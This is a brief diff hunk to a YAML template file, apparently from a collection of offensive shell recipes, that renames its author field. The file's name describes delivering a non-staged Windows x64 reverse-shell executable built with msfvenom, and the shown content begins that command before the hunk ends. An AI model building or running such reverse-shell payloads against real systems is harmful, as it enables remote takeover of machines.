@@ -3,7 +3,7 @@ metadata:
   filename: "deliver-windows-x64-revshell-msfvenom-nonstaged-exe.yaml"
   tags: ["shell", "windows"]
   created: "2025-03-29"
-  author: "Unknown"
+  authors: ["Unknown"]
 
 content: |
   mkdir -p packstation/outbound; echo 'msfvenom creates the payload. Please wait...'; \
